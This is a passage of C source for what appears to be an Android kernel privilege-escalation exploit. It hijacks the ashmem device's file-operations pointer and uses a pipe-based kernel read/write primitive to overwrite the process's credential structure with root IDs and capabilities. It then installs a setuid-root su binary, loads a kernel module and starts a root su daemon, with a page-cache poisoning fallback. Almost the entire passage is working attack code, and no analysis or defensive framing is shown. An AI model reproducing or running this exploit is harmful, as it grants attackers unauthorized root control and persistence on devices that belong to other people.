      pr_info("chain v109 su daemon spawned pid=%d (attempt %d)\n",
              (int)pid, attempt);
    }
    int sock_seen = 0;
    for (int ms = 0; ms < 3000; ms += 20) {
      struct stat sockst;
      if (stat(chain_sock_effective, &sockst) == 0) {
        sock_seen = 1;
        if (sockst.st_uid == 0) {
          pr_success("chain v109 su daemon socket verified (attempt "
                     "%d, spawner pid=%d, path=%s)\n", attempt,
                     (int)pid, chain_sock_effective);
          return 1;
        }
        pr_warning("chain v109 su daemon socket uid=%lu != 0 (not a "
                   "root daemon, attempt %d)\n",
                   (unsigned long)sockst.st_uid, attempt);
        break;
      }
      usleep(20000);
    }
    struct stat diagst;
    int diag_errno = (stat(chain_sock_effective, &diagst) != 0) ? errno
                                                                : 0;
    if (sock_seen) {
      pr_warning("chain v109 su daemon socket not root-owned after "
                 "3000ms (attempt %d, spawner pid=%d, path=%s)\n",
                 attempt, (int)pid, chain_sock_effective);
    } else {
      pr_warning("chain v109 su daemon socket absent after 3000ms "
                 "(attempt %d, spawner pid=%d, path=%s)\n", attempt,
                 (int)pid, chain_sock_effective);
    }
    if (chain_sock_effective == sock_default && attempt < 3) {
      pr_warning("chain v108.1 socket fallback path=%s (reason "
                 "errno=%d)\n", CHAIN_SU_SOCK_FALLBACK, diag_errno);
      chain_sock_effective = CHAIN_SU_SOCK_FALLBACK;
      setenv("SU_SOCK_PATH", CHAIN_SU_SOCK_FALLBACK, 1);
    }
  }
  pr_warning("chain v109 su daemon spawn failed after 3 attempts\n");
  return 0;
}
static void chain_su_exec_verify(void) {
  for (int ms = 0; ms < 2000; ms += 10) {
    struct stat st;
    if (stat(chain_sock_effective, &st) == 0) {
      break;
    }
    usleep(10000);
  }
  fflush(stdout);
  pid_t pid = fork();
  if (pid < 0) {
    pr_warning("chain v103 su exec verify fork failed errno=%d\n", errno);
    return;
  }
  if (pid == 0) {
    execl(chain_su_effective, "su", "-c", "id", (char *)NULL);
    pr_warning("chain v103 su exec failed path=%s errno=%d\n",
               chain_su_effective, errno);
    _exit(127);
  }
  int st = 0;
  pid_t w = waitpid(pid, &st, 0);
  pr_info("chain v103 su exec verify pid=%d wait=%d st=%d WIFEXITED=%d "
          "code=%d WIFSIGNALED=%d sig=%d\n",
          (int)pid, (int)w, st, WIFEXITED(st) ? 1 : 0,
          WIFEXITED(st) ? WEXITSTATUS(st) : 0,
          WIFSIGNALED(st) ? 1 : 0, WIFSIGNALED(st) ? WTERMSIG(st) : 0);
}

static int chain_cred_patch_one(int fd, uintptr_t p, const char *tag) {
  static const uint8_t zero16[16] = {0};
  static const uint8_t zero8[8] = {0};
  uint8_t buf[4 + 4 * CHAIN_CRED_ID_COUNT];
  uint8_t rb[16];
  uint8_t orig8[8];
  uint64_t origq;

  if (!chain_pipebuf_revalidate(fd)) {
    chain_park("pipebuf revalidate failed (step-b)");
    return 0;
  }
  chain_step_write(fd, "step-b", p + CRED_UID_OFF, zero16,
                   sizeof(zero16));
  chain_step_read(fd, "step-b", p + CRED_UID_OFF, rb, sizeof(zero16));
  chain_step_verify("step-b", rb, zero16, sizeof(zero16));
  pr_info("chain v101 step-b clean %s=%016zx\n", tag, p);

  chain_step_read(fd, "step-c", p + 0x14, orig8, sizeof(orig8));
  memcpy(&origq, orig8, sizeof(origq));
  fflush(stdout);
  pr_info("chain v101 step-c orig %s=%016zx =%016llx\n", tag, p,
          (unsigned long long)origq);
  chain_step_write(fd, "step-c", p + 0x14, orig8, sizeof(orig8));
  chain_step_read(fd, "step-c", p + 0x14, rb, sizeof(orig8));
  chain_step_verify("step-c", rb, orig8, sizeof(orig8));
  pr_info("chain v101 step-c write-back survived %s=%016zx - "
          "content-trigger branch\n", tag, p);

  chain_cred_patch_caps(fd, p, tag);

  chain_stage = "su-install";
  fflush(stdout);
  if (!chain_su_install_uid0()) {
    pr_warning("chain v103 su install FAILED errno=%d - deliverable "
               "missing, continuing\n", errno);
  }
  chain_lkm_insmod();
  chain_su_spawn_daemon();
  chain_stage = "su-exec-verify";
  chain_su_exec_verify();

  chain_stage = "cred-readback";
  fflush(stdout);
  pr_info("chain cred readback %s=%016zx enter len=%zu\n", tag, p,
          sizeof(buf));
  if (!pipe_splice_read_range(fd, p, buf, sizeof(buf))) {
    pr_warning("chain cred readback failed %s=%016zx\n", tag, p);
    return 0;
  }
  for (int k = 0; k < 4; k++) {
    uint32_t v = *(uint32_t *)(buf + 4 + 4 * k);
    if (v != 0) {
      pr_warning("chain v103 pre-killer readback nonzero %s=%016zx "
                 "id#%d=%u\n",
                 tag, p, k, v);
      return 0;
    }
  }
  pr_success("chain v103 deliverables clean %s=%016zx usage=%u "
             "(killer writes pending)\n",
             tag, p, *(uint32_t *)(buf + 0));

  chain_step_write(fd, "step-c", p + 0x14, zero8, sizeof(zero8));
  chain_step_read(fd, "step-c", p + 0x14, rb, sizeof(zero8));
  chain_step_verify("step-c", rb, zero8, sizeof(zero8));
  pr_info("chain v101 step-c zeroed %s=%016zx\n", tag, p);

  chain_step_write(fd, "step-d", p + 0x1c, zero8, sizeof(zero8));
  chain_step_read(fd, "step-d", p + 0x1c, rb, sizeof(zero8));
  chain_step_verify("step-d", rb, zero8, sizeof(zero8));
  pr_info("chain v101 step-d clean %s=%016zx\n", tag, p);

  if (!pipe_splice_read_range(fd, p, buf, sizeof(buf))) {
    pr_warning("chain cred readback failed %s=%016zx (post-killer)\n",
               tag, p);
    return 0;
  }
  int bad = 0;
  for (int k = 0; k < CHAIN_CRED_ID_COUNT; k++) {
    uint32_t v = *(uint32_t *)(buf + 4 + 4 * k);
    if (v != 0) {
      pr_warning("chain cred readback nonzero %s=%016zx id#%d=%u\n",
                 tag, p, k, v);
      bad = 1;
    }
  }
  if (bad) {
    return 0;
  }
  pr_success("chain cred readback clean %s=%016zx usage=%u\n",
             tag, p, *(uint32_t *)(buf + 0));
  pr_success("chain cred patched %s uid=%u gid=%u euid=%u fsuid=%u\n",
             tag, *(uint32_t *)(buf + 4), *(uint32_t *)(buf + 8),
             *(uint32_t *)(buf + 20), *(uint32_t *)(buf + 28));
  return 1;
}

static int chain_cred_scan(int fd, uintptr_t task, uintptr_t *creds,
                           int *nfound, uint32_t *usage_out) {
  *nfound = 0;
  *usage_out = 0;

  uintptr_t real = 0, cred = 0;
  uint8_t pair[16];
  if (pipe_splice_read_range(fd, task + OFF_TASK_REAL_CRED, pair,
                             sizeof(pair))) {
    memcpy(&real, pair + 0, sizeof(real));
    memcpy(&cred, pair + 8, sizeof(cred));
    pr_info("chain cred pair task=%016zx real=%016zx cred=%016zx\n",
            task, real, cred);
    uint32_t usage_real = 0, usage_cred = 0;
    int ok_real = chain_cred_validate(fd, real, "real", &usage_real);
    int ok_cred = chain_cred_validate(fd, cred, "cred", &usage_cred);
    if (ok_real && ok_cred) {
      creds[(*nfound)++] = cred;
      if (real != cred && *nfound < 2) {
        creds[(*nfound)++] = real;
      }
      *usage_out = usage_cred;
      pr_success("chain cred validate ok real=%016zx cred=%016zx usage=%u\n",
                 real, cred, usage_cred);
      return 1;
    }
    pr_warning("chain cred validate fail real=%016zx cred=%016zx "
               "ok_real=%d ok_cred=%d - falling back to signature scan\n",
               real, cred, ok_real, ok_cred);
  } else {
    pr_warning("chain cred pair read failed task=%016zx off=0x%x\n",
               task, OFF_TASK_REAL_CRED);
  }

  static uint8_t win[CHAIN_CRED_SCAN_BYTES];
  if (!pipe_splice_read_range(fd, task, win, sizeof(win))) {
    pr_warning("chain cred scan task read failed task=%016zx\n", task);
    return 0;
  }
  int n = 0;
  uint32_t usage = 0;
  for (size_t off = 0; off + sizeof(uint64_t) <= sizeof(win);
       off += sizeof(uint64_t)) {
    uintptr_t p;
    memcpy(&p, win + off, sizeof(p));
    if (!is_direct_ptr(p)) {
      continue;
    }
    int dup = 0;
    for (int k = 0; k < n; k++) {
      if (creds[k] == p) {
        dup = 1;
        break;
      }
    }
    if (dup) {
      continue;
    }
    if (!chain_cred_validate(fd, p, NULL, &usage)) {
      continue;
    }
    creds[n++] = p;
    if (n >= 2) {
      break;
    }
  }
  *nfound = n;
  *usage_out = usage;
  if (n > 0) {
    pr_warning("chain cred scan fallback task=%016zx n=%d cred#0=%016zx "
               "cred#1=%016zx usage=%u (pair slots failed validation)\n",
               task, n, creds[0], n > 1 ? creds[1] : 0, usage);
  } else {
    pr_warning("chain cred scan task=%016zx found no cred pointer\n",
               task);
  }
  return n > 0;
}

static int chain_cred_patch(int fd, uintptr_t task) {
  int dryrun = env_flag("SLIDE_CRED_DRYRUN", 0);
  uintptr_t creds[2] = {0, 0};
  int n = 0;
  uint32_t usage = 0;
  pr_info("chain cred walk enter task=%016zx\n", task);
  if (!chain_cred_scan(fd, task, creds, &n, &usage)) {
    pr_warning("chain cred walk no validated cred - falling through to "
               "poison+trigger\n");
    return 0;
  }
  chain_cred_dump(fd, creds[0]);
  if (!dryrun) {
    chain_step_a(fd);
  }
  if (dryrun) {
    pr_info("chain cred dryrun creds=%d usage=%u - no writes\n", n,
            usage);
    return 0;
  }
  int ok = 0;
  for (int k = 0; k < n; k++) {
    char tag[8];
    snprintf(tag, sizeof(tag), "cred#%d", k);
    ok += chain_cred_patch_one(fd, creds[k], tag) ? 1 : 0;
  }
  return ok > 0;
}

static int chain_su_install_uid0(void) {
  static uint8_t iobuf[65536];
  int src = open(chain_glsu_effective, O_RDONLY | O_CLOEXEC);
  if (src < 0) {
    pr_warning("chain su src open failed path=%s errno=%d\n",
               chain_glsu_effective, errno);
    return 0;
  }
  pr_info("chain su step src open fd=%d path=%s\n", src,
          chain_glsu_effective);
  int dst = open(chain_su_effective,
                 O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 04755);
  if (dst < 0) {
    unlink(chain_su_effective);
    dst = open(chain_su_effective,
               O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 04755);
  }
  if (dst < 0) {
    int open_errno = errno;
    pr_warning("chain v108.1 su fallback path=%s (reason errno=%d)\n",
               CHAIN_SU_PATH_FALLBACK, open_errno);
    chain_su_effective = CHAIN_SU_PATH_FALLBACK;
    dst = open(chain_su_effective,
               O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 04755);
    if (dst < 0) {
      pr_warning("chain su dst open failed path=%s errno=%d\n",
                 chain_su_effective, errno);
      close(src);
      return 0;
    }
  }
  pr_info("chain su step dst open fd=%d path=%s\n", dst,
          chain_su_effective);
  for (;;) {
    ssize_t r = read(src, iobuf, sizeof(iobuf));
    if (r < 0) {
      pr_warning("chain su read failed errno=%d\n", errno);
      close(src);
      close(dst);
      return 0;
    }
    if (r == 0) {
      break;
    }
    ssize_t off = 0;
    while (off < r) {
      ssize_t w = write(dst, iobuf + off, (size_t)(r - off));
      if (w <= 0) {
        pr_warning("chain su write failed errno=%d\n", errno);
        close(src);
        close(dst);
        return 0;
      }
      off += w;
    }
  }
  close(src);
  close(dst);
  pr_info("chain su step copy done\n");
  if (chown(chain_su_effective, 0, 0) != 0) {
    pr_warning("chain su chown failed path=%s errno=%d\n",
               chain_su_effective, errno);
    return 0;
  }
  pr_info("chain su step chown ok\n");
  if (chmod(chain_su_effective, 04755) != 0) {
    pr_warning("chain su chmod failed path=%s errno=%d\n",
               chain_su_effective, errno);
    return 0;
  }
  pr_info("chain su step chmod ok\n");
  struct stat st;
  if (stat(chain_su_effective, &st) != 0) {
    pr_warning("chain su stat failed path=%s errno=%d\n",
               chain_su_effective, errno);
    return 0;
  }
  pr_info("chain su step stat ok size=%ld mode=%o\n", (long)st.st_size,
          st.st_mode & 07777);
  sync();
  pr_success("chain su installed path=%s size=%ld mode=04755 "
             "owner=0:0\n", chain_su_effective, (long)st.st_size);
  pr_success("chain glm done\n");
  return 1;
}

static int chain_trigger(void) {
  static const int families[] = {9, 33, 4, 6};
  for (size_t i = 0; i < sizeof(families) / sizeof(families[0]); i++) {
    errno = 0;
    int s = socket(families[i], SOCK_DGRAM, 0);
    int ret = (int)s;
    int ferr = errno;
    if (s >= 0) {
      close(s);
    }
    pr_info("chain trigger fam=%d ret=%d errno=%d\n", families[i], ret,
            ferr);
  }
  for (int i = 0; i < 100; i++) {
    if (access(CHAIN_GLM_DONE, F_OK) == 0) {
      struct stat st;
      if (stat(CHAIN_SU_PATH, &st) == 0 && (st.st_mode & 07777) == 04755) {
        pr_success("chain su installed mode=%o after ~%d00ms\n",
                   st.st_mode & 07777, i);
        return 1;
      }
      pr_warning("chain glm.done but su missing or not setuid\n");
      return 0;
    }
    usleep(100000);
  }
  pr_warning("chain glm.done not seen within %dms\n",
             CHAIN_GLM_TIMEOUT_USEC / 1000);
  return 0;
}

static void chain_restore_hijack(void) {
  int vfd = open_ashmem_device();
  if (vfd < 0) {
    pr_warning("chain restore open failed errno=%d\n", errno);
    return;
  }
  uint64_t orig = ASHMEM_FOPS_STRUCT;
  ssize_t wr = configfs_write_once(vfd, ASHMEM_MISC_FOPS_SLOT, &orig,
                                   sizeof(orig));
  pr_info("chain restore hijack wr=%zd\n", wr);
  close(vfd);
}

int run_poison_chain(void) {
  clock_gettime(CLOCK_MONOTONIC, &chain_t0);
  pr_info("chain v109 enter pid=%d (futex_q first-try, task-walk "
          "fallback)\n", getpid());
  signal(SIGPIPE, SIG_IGN);
  pthread_t hb;
  if (pthread_create(&hb, NULL, chain_heartbeat_thread, NULL) == 0) {
    pthread_detach(hb);
  }


  slide_probe("chain:begin");
  if (access(CHAIN_TARGET_PATH, R_OK) != 0) {
    pr_warning("chain target %s not accessible errno=%d\n",
               CHAIN_TARGET_PATH, errno);
    return 0;
  }
  unlink(CHAIN_GLM_DONE);
  if (!chain_install_glsu()) {
    slide_probe("chain:glsu-failed");
    return 0;
  }
  slide_probe("chain:glsu-ok");

  int ok = 0;
  int fd = -1;
  chain_tfd = -1;

  if (!util_frame_guard(slide_probe_cached_fd())) {
    chain_park("v105 frame-foreign -> park (no chain openat)");
  }
  fd = open_ashmem_device();
  if (fd < 0) {
    pr_warning("chain ashmem open failed errno=%d\n", errno);
    goto out;
  }
  if (pipebuf_page_base == 0) {
    pr_warning("chain pipebuf not prepared (page_base=0), skipping\n");
    goto out;
  }
  slide_probe("chain:physrw-installing");
  if (!install_pipe_physrw(fd)) {
    pr_error("chain install_pipe_physrw failed\n");
    goto out;
  }

  chain_tfd = open(CHAIN_TARGET_PATH, O_RDONLY | O_CLOEXEC);
  if (chain_tfd < 0) {
    pr_warning("chain open target failed errno=%d\n", errno);
    goto out;
  }
  char tmp[4096];
  ssize_t n = read(chain_tfd, tmp, sizeof(tmp));
  if (n <= 0) {
    pr_warning("chain read target failed n=%zd errno=%d\n", n, errno);
    goto out;
  }
  pr_success("chain target open fd=%d read=%zd (page cache filled)\n",
             chain_tfd, n);

  pthread_t th;
  if (pthread_create(&th, NULL, chain_waiter_thread, NULL) != 0) {
    pr_warning("chain waiter create failed errno=%d\n", errno);
    goto out;
  }
  while (!atomic_load(&chain_waiter_ready)) {
    usleep(1000);
  }
  usleep(200000);
  pr_info("chain pre-locate t=%ldms\n", chain_ms());

  chain_stage = "locate";
  uintptr_t q = 0;
  uintptr_t task = 0;
  slide_probe("chain:locating-q");
  if (!chain_locate_futex_q(fd, &q, &task)) {
    slide_probe("chain:task-walk");
    task = chain_locate_task_walk(fd);
    if (task == 0) {
      slide_probe("chain:locate-fail");
      goto out;
    }
  }
  chain_stage = "cred-patch";
  if (env_flag("SLIDE_CRED_WRITE", 1) && chain_cred_patch(fd, task)) {
    slide_probe("chain:cred-ok");
    ok = 1;
    goto out;
  }

  uintptr_t files = 0;
  uintptr_t filp = 0;
  uint64_t xa_head = 0;
  uintptr_t page_direct = 0;
  slide_probe("chain:walking-files");
  chain_stage = "walk-files";
  if (!chain_get_files(fd, task, &files) ||
      !chain_get_filp(fd, files, chain_tfd, &filp) ||
      !chain_get_xa_head(fd, filp, &xa_head) ||
      !chain_decode_first_page(fd, xa_head, &page_direct)) {
    goto out;
  }

  chain_stage = "poison";
  slide_probe("chain:poisoning");
  ok = chain_poison_page(fd, page_direct) && chain_trigger();
  { char pb[48]; snprintf(pb, sizeof(pb), "chain:done ok=%d", ok);
    slide_probe(pb); }


out:
  atomic_store(&chain_hb_stop, 1);
  chain_restore_hijack();
  if (chain_tfd >= 0) {
    close(chain_tfd);
    chain_tfd = -1;
  }
  if (fd >= 0) {
    close(fd);
  }
  return ok;
}
